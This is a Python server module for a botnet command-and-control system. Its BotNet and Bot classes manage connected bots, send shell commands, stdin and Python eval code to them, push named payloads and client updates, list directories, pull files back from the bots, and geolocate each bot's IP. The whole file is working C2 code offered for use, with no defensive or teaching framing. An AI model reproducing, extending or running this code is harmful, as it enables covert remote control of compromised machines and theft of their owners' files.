from server import formatsock
from server.botfilemanager import BotNetFileManager
from server.botpayloadmanager import BotNetPayloadManager

import json
from threading import Thread
import threading
import select
import base64
import os
import time
import uuid
import urllib.request
import socket


class BotNet(Thread):
    INPUT_TIMEOUT = 1
    BOTCHECK_TIMEOUT = 10
    PRINTOUT_JSON = 'printout'
    ERROUT_JSON = 'errout'
    STDOUT_JSON = 'stdout'
    STDERR_JSON = 'stderr'
    SPEC_JSON = 'special'
    FILESTREAM_JSON = 'filestreams'
    FILECLOSE_JSON = 'fileclose'
    LS_JSON = 'ls'
    FILESIZE_JSON = 'filesize'

    DEFAULT_PAYLOAD = os.path.join(os.path.dirname(__file__), 'payloads')
    DEFAULT_DOWNLOADPATH = os.path.join(os.path.join(os.path.dirname(__file__), 'static'), 'downloads')

    def __init__(self, socketio, app, payloadpath=DEFAULT_PAYLOAD, downloadpath=DEFAULT_DOWNLOADPATH):
        super().__init__()
        self.connlock = threading.Lock()
        self.conncon = threading.Condition(self.connlock)
        self.onlineConnections = {}
        self.offlineConnections = {}
        self.logs = {}
        self.app = app
        self.socketio = socketio

        self.filemanager = BotNetFileManager(downloadpath)
        self.payloadmanager = BotNetPayloadManager(payloadpath)
        self.downloaddir = downloadpath

    def checkDB(self):
        '''
        Perform database checks with app context
        '''
        with self.app.app_context():
            self.filemanager.checkDatabase()

    def hasConnection(self, user):
        '''
        :param user: username of bot
        :return: boolean if bot is in online or offline groups
        '''
        with self.connlock:
            if user in self.offlineConnections:
                return True
            return user in self.onlineConnections

    def addConnection(self, user, clientsock, host_info):
        '''
        Adds a connection to the network
        :param user: username
        :param clientsock: communication socket
        :param host_info: information (user, arch, version, id)
        '''
        print("[*] Adding connection {}".format(user))
        with self.connlock:
            if user in self.offlineConnections:
                print("\tRestoring connection...")
                conn = self.offlineConnections[user]
                conn.setip(host_info['addr'])
                conn.setsocket(clientsock)
                print("\tRestored!")
            else:
                conn = Bot(clientsock, host_info, self.socketio)
            if not host_info['bid']:
                if conn.bid is None:
                    conn.setId(str(uuid.uuid4()))
                else:
                    conn.setId(conn.bid)
            self.onlineConnections[user] = conn
            self.logs[user] = BotLog(user)
            self.conncon.notifyAll()
            # Notify recv thread
            self.socketio.emit('connection', {'user': user}, namespace='/bot')

    def removeConnection(self, user):
        '''
        Remove connection from online/offline storage
        :param user: username of connection
        '''
        # Will be making changes to allConnections
        print("[*] Removing user {}".format(user))
        with self.connlock:
            if user in self.onlineConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.onlineConnections[user].close()
                except IOError:
                    pass
                # Remove object, don't delete so sends still go through
                self.onlineConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))
            elif user in self.offlineConnections:
                self.offlineConnections.pop(user)

    def setOffline(self, user):
        '''
        Sets a user offline
        :param user: username of connection
        '''
        # Will be making changes to allConnections
        print("[*] Setting {} offline".format(user))
        with self.connlock:
            if user in self.onlineConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.onlineConnections[user].close()
                except IOError:
                    pass
                conn = self.onlineConnections.pop(user)
                self.offlineConnections[user] = conn
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getOnlineConnections(self):
        '''
        :return: List of online connections
        '''
        with self.connlock:
            return self.onlineConnections.keys()

    def getConnectionDetails(self, spec=None):
        '''
        :return: a dictionary of {[username]:{"online":[T/F], "lastonline":[unixtime], "arch":[arch]}, ...}
        '''
        with self.connlock:
            if spec:
                if spec in self.onlineConnections:
                    bot = self.onlineConnections[spec]
                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                elif spec in self.offlineConnections:
                    bot = self.offlineConnections[spec]
                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                else:
                    return {}
            else:
                dets = {}
                for username in self.onlineConnections.keys():
                    bot = self.onlineConnections[username]
                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                for username in self.offlineConnections.keys():
                    bot = self.offlineConnections[username]
                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, state=bot.state)
                return dets

    def run(self):
        '''
        Parse information coming from bots, loops
        '''
        last_botcheck = time.time()
        seen_dict = {}
        sent_heartbeat = False
        while True:
            with self.connlock:
                bots = list(self.onlineConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.onlineConnections.values())
                for bot in bots:
                    if bot not in seen_dict:
                        seen_dict[bot] = True
            with self.app.app_context():
                # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
                # TODO maybe use pipe as interrupt instead of timeout?
                rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
                # We now have a tuple of all bots that have sent data to the botnet
                for bot in rs:
                    user = bot.user
                    try:
                        msg = bot.recv()
                        jsonobj = json.loads(msg.decode('UTF-8'))
                        printout = ""
                        errout = ""
                        out = ""
                        err = ""
                        special = {}
                        filestream = {}
                        fileclose = []

                        if BotNet.PRINTOUT_JSON in jsonobj:
                            printout = jsonobj[BotNet.PRINTOUT_JSON]
                        if BotNet.ERROUT_JSON in jsonobj:
                            errout = jsonobj[BotNet.ERROUT_JSON]
                        if BotNet.STDOUT_JSON in jsonobj:
                            out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                        if BotNet.STDERR_JSON in jsonobj:
                            err = jsonobj[BotNet.STDERR_JSON].rstrip()
                        if BotNet.SPEC_JSON in jsonobj:
                            special = jsonobj[BotNet.SPEC_JSON]
                        if BotNet.FILESTREAM_JSON in jsonobj:
                            filestream = jsonobj[BotNet.FILESTREAM_JSON]
                        if BotNet.FILECLOSE_JSON in jsonobj:
                            fileclose = jsonobj[BotNet.FILECLOSE_JSON]

                        # Forward stdout/stderr... as needed
                        totallen = len(printout) + len(errout) + len(out) + len(err)
                        if totallen > 0:
                            # Send through socket
                            self.socketio.emit('response',
                                               {'user': user,
                                                'printout': printout,
                                                'errout': errout,
                                                'stdout': out,
                                                'stderr': err},
                                               namespace="/bot")
                            # Separate to minimize time in Lock
                            log = None
                            with self.connlock:
                                if user in self.logs:
                                    log = self.logs[user]
                            if log:
                                log.logstdout(printout)
                                log.logstderr(errout)
                                log.logstdout(out)
                                log.logstderr(err)

                        if len(special) > 0:
                            if BotNet.LS_JSON in special:
                                self.socketio.emit('finder',
                                                   {'special': special,
                                                    'user': user},
                                                   namespace="/bot")
                            if BotNet.FILESIZE_JSON in special:
                                self.socketio.emit('success', {'user': user,
                                                               'message': "File download beginning",
                                                               'type': 'download'},
                                                   namespace='/bot')
                                fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
                                self.filemanager.setFileSize(user, fileinfo['filename'], fileinfo['filesize'])

                        # Forward file bytes as needed
                        for filename in filestream.keys():
                            # Get the b64 encoded bytes from the client in string form, change to normal bytes
                            filebytes = base64.b64decode(filestream[filename])
                            self.filemanager.appendBytesToFile(user, filename, filebytes)

                        for filename in fileclose:
                            self.filemanager.closeFile(user, filename)

                        seen_dict[bot] = True

                    except IOError as e:
                        # Connection was interrupted, set to offline
                        print(e)
                        self.setOffline(user)
                    except Exception as e:
                        print(e)

                # Send heartbeats to all bots. If not response within a few loops then offline them.
                if self.BOTCHECK_TIMEOUT/2 < (time.time() - last_botcheck) and not sent_heartbeat:
                    for bot in bots:
                        bot.heartbeat()
                    sent_heartbeat = True

                if self.BOTCHECK_TIMEOUT < (time.time() - last_botcheck):
                    # Check all bots for connectivity
                    for bot in bots:
                        if not seen_dict[bot]:
                            self.setOffline(bot.user)
                    last_botcheck = time.time()
                    seen_dict = {b: False for b in bots if b.online}
                    sent_heartbeat = False

    def getLog(self, user):
        '''
        Return recent output log of bot
        :param user: username of bot
        :return: log
        '''
        with self.connlock:
            log = []
            if user in self.logs:
                for entry in self.logs[user].log:
                    log.append(entry)
            return log

    def clearLog(self, user):
        '''
        Clears log of bot
        :param user: username of bot
        '''
        with self.connlock:
            if user in self.logs:
                self.logs[user].log = []

    def sendKillProc(self, user):
        '''
        Tell bot to kill and restart process
        :param user: username of bot
        :return: True/False if command sent
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].send("True", sendtype="kill")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendStdin(self, user, cmd):
        '''
        Send stdin to bot process
        :param user: username of bot
        :param cmd: stdin to write
        :return: True/False sent/queued
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.logs[user].logstdin(cmd)
                self.onlineConnections[user].send(cmd, sendtype="stdin")
                return True
            elif user in self.offlineConnections:
                print("Sending offline")
                self.logs[user].logstdin(cmd)
                self.offlineConnections[user].send(cmd, sendtype="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        '''
        Send command to spawn new proc
        :param user: username of bot
        :param cmd: proc to spawn
        :return: True/False sent/queued
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.logs[user].logsdin("(cmd \"" + cmd + "\")")
                self.onlineConnections[user].send(cmd, sendtype="cmd")
                return True
            elif user in self.offlineConnections:
                self.logs[user].logsdin("(cmd \"" + cmd + "\")")
                self.offlineConnections[user].send(cmd, sendtype="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        '''
        Send code to python eval on bot
        :param user: username of bot
        :param cmd: code to eval
        :return: True/False if sent/queued
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].send(cmd, sendtype="eval")
                return True
            elif user in self.offlineConnections:
                self.offlineConnections[user].send(cmd, sendtype="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        '''
        Send a file to the bot
        :param user: username of bot
        :param filename: filename
        :param fileobj: file object
        :return: True/False sent
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].sendFile(filename, fileobj)
                return True
            elif user in self.offlineConnections:
                self.offlineConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def startFileDownload(self, user, filename):
        '''
        Send command to start file download to server
        :param user: username of bot
        :param filename: path of file to download
        :return: True/False if sent/queued
        '''
        with self.connlock:
            if user in self.onlineConnections:
                if not self.filemanager.fileIsDownloading(user, filename):
                    self.onlineConnections[user].startFileDownload(filename)
                return True
            elif user in self.offlineConnections:
                if not self.filemanager.fileIsDownloading(user, filename):
                    self.offlineConnections[user].startFileDownload(filename)
                return True
            return None

    def getPayloadNames(self):
        ''':return: payload names'''
        return self.payloadmanager.getPayloadNames()

    def getPayloads(self):
        '''
        :return: payload names and details
        '''
        return self.payloadmanager.getPayloads()

    def sendPayload(self, user, payload, args):
        '''
        Send a payload by name with arguments
        :param user: username of bot to which to send payload
        :param payload: name of payload
        :param args: args for payload
        :return: True/False if successfully sent/queued
        '''
        payloadtext = self.payloadmanager.getPayloadText(payload, args)
        if payloadtext:
            with self.connlock:
                if user in self.logs:
                    self.logs[user].logstdin("(payload \"" + payload + "\")")
            return self.sendEval(user, payloadtext)
        else:
            return False

    def requestLs(self, user, filename):
        '''
        Request that the bot provide an ls return
        :param user: username of bot
        :param filename: path for requested ls
        '''
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].requestLs(filename)

    def getFileManager(self):
        ''':return: file manager'''
        return self.filemanager

    def getDownloadFiles(self):
        ''':return: files available for download + info'''
        return self.filemanager.getFilesAndInfo()

    def getFileName(self, user, filename):
        '''
        Gets the local name of a remote file after download
        :param user: username of bot
        :param filename: remote filename
        :return: local filename
        '''
        return self.filemanager.getFileName(user, filename)

    def deleteFile(self, user, filename):
        '''
        Delete a local instance of a file
        :param user: username of bot
        :param filename: remote name of file
        :return: True/False if deleted
        '''
        return self.filemanager.deleteFile(user, filename)


class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'
    FILE_DOWNLOAD = 'down'
    LS_JSON = 'ls'
    ASSIGN_ID = 'assign'
    HEARTBEAT = 'heartbeat'
    HEARTBEAT_TIMEOUT = 3

    def __init__(self, sock, host_info, socketio, lastonline=int(time.time()), online=True):
        self.sock = formatsock.FormatSocket(sock)
        self.user = host_info['user']
        self.arch = host_info['arch']
        self.ip = host_info['addr']
        self.bid = host_info['bid']
        self.state = self.getState(host_info['addr'])

        self.socketio = socketio
        self.lastonline = lastonline

        # Threads can acquire RLocks as many times as needed, important for the queue
        self.datalock = threading.RLock()
        self.online = online
        # Opqueue is a list of tuples of (function, (args...)) to be done once
        # the bot in online
        self.opqueue = []

    def getState(self, ip):
        '''
        Get the State in which the ip resides
        :param ip: ip to check
        :return: State
        '''
        response = urllib.request.urlopen("http://www.freegeoip.net/json/{}".format(ip)).read()
        state = json.loads(response.decode('UTF-8'))['region_code']
        return state

    def send(self, cmd, sendtype="stdin"):
        '''
        Send a command to the bot
        :param cmd: command text
        :param sendtype: type of command (stdin, cmd, eval)
        '''
        print("[*] Sending command of type {} to {}".format(sendtype, self.user))
        json_str = json.dumps({sendtype: cmd})
        with self.datalock:
            if self.online:
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.send, (cmd, sendtype)))

    def setId(self, bid):
        '''
        Set the id of the bot (calls back with it later)
        :param bid: id for future callback
        '''
        print("[*] Setting bot id to {}".format(bid))
        json_str = json.dumps({Bot.ASSIGN_ID:bid})
        with self.datalock:
            if self.online:
                self.sock.send(json_str)
                self.bid = bid
            else:
                self.opqueue.append((self.setId,(bid,)))

    def recv(self):
        '''
        Receive data from the bot (blocking)
        :return: bytes
        '''
        # Getting the object requires a lock, using it doesn't
        with self.datalock:
            sock = self.sock

        # Try to receive, on error set offline
        try:
            return sock.recv()
        except IOError as e:
            # Setting offline requires a lock
            with self.datalock:
                self.online = False
                self.lastonline = int(time.time())
                raise e

    def setsocket(self, newsock, nowonline=True):
        '''
        Swap the socket with a new one
        :param newsock: new socket to use
        :param nowonline: should the bot now be considered online?
        '''
        with self.datalock:
            if self.online:
                self.sock.close()
            self.sock = formatsock.FormatSocket(newsock)
            self.online = nowonline
            if self.online:
                self.lastonline = int(time.time())
                # Run operations if needed, this is where
                # the RLock distinction is needed
                for runop in self.opqueue:
                    func, args = runop
                    func(*args)
                self.opqueue.clear()

    def setip(self, ip):
        '''
        Set the ip of the bot
        :param ip: new ip
        '''
        with self.datalock:
            self.ip = ip

    def close(self):
        '''
        Close the socket and set the bot offline
        :return: True of now closed and wasn't before
        '''
        with self.datalock:
            if self.online:
                self.online = False
                self.lastonline = int(time.time())
                try:
                    self.sock.close()
                    return True
                except IOError:
                    return False
            return False

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        with self.datalock:
            if self.online:
                return self.sock.fileno()
            else:
                return -1

    def sendFile(self, filename, fileobj):
        '''
        Send a file to the bot (non-blocking)
        :param filename: name of file
        :param fileobj: file object
        '''
        with self.datalock:
            if self.online:
                t = Thread(target=self.__sendFileHelper(fileobj, filename))
                t.start()
            else:
                self.opqueue.append((self.sendFile, (filename, fileobj)))

    def sendClientFile(self, fileobj):
        '''
        Upload a new client file to the bot (update)
        :param fileobj: client file object
        '''
        self.sendFile(None, fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        '''
        Helper function for threads
        '''
        dat = fileobj.read(Bot.FILE_SHARD_SIZE)
        if len(dat) > 0:
            while len(dat) > 0:
                # Turn the bytes into b64 encoded bytes, then into string
                bytestr = base64.b64encode(dat).decode('UTF-8')
                if filename:
                    # Particular file
                    json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                else:
                    # Client file
                    json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                with self.datalock:
                    self.sock.send(json_str)
                dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if filename:
                json_str = json.dumps({Bot.FILE_CLOSE: filename})
            else:
                json_str = json.dumps({Bot.CLIENT_CLOSE: True})
            with self.datalock:
                self.sock.send(json_str)
                fileobj.close()
                self.socketio.emit('success', {'user': self.user,
                                               'message': "File upload successful",
                                               'type': 'upload'},
                                   namespace='/bot')

    def startFileDownload(self, filename):
        '''
        Tell a bot to start sending back file data
        :param filename: path to file
        '''
        with self.datalock:
            if self.online:
                json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.startFileDownload, (filename,)))

    def requestLs(self, filename):
        '''
        Tell a bot to send back directory listing
        :param filename: path to directory
        '''
        with self.datalock:
            if self.online:
                json_str = json.dumps({Bot.LS_JSON: filename})
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.requestLs, (filename,)))

    def heartbeat(self):
        with self.datalock:
            if self.online:
                json_str = json.dumps({Bot.HEARTBEAT: True})
                old_timeout = self.sock.gettimeout()
                self.sock.settimeout(Bot.HEARTBEAT_TIMEOUT)
                try:
                    self.sock.send(json_str)
                    return True
                except socket.timeout as e:
                    return False
                finally:
                    self.sock.settimeout(old_timeout)
            else:
                return False


class BotLog:
    STDOUT = 0
    STDERR = 1
    STDIN = 2

    def __init__(self, user, maxlen=100, logdir="logs"):
        self.user = user
        self.log = []
        self.maxlen = maxlen
        if not os.path.isdir(logdir):
            os.mkdir(logdir)
        self.logpath = os.path.join(logdir, user + ".log")
        self.logobj = open(self.logpath, "a")

    def logstdin(self, win):
        if len(win) > 0:
            try:
                self.log.append((BotLog.STDIN, win))
                self.logobj.write("[IN]: \t" + str(win) + ("\n" if win[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass

    def logstdout(self, wout):
        if len(wout) > 0:
            try:
                self.log.append((BotLog.STDOUT, wout))
                self.logobj.write("[OUT]:\t" + str(wout) + ("\n" if wout[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass

    def logstderr(self, wout):
        if len(wout) > 0:
            try:
                self.log.append((BotLog.STDERR, wout))
                self.logobj.write("[ERR]:\t" + str(wout) + ("\n" if wout[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass
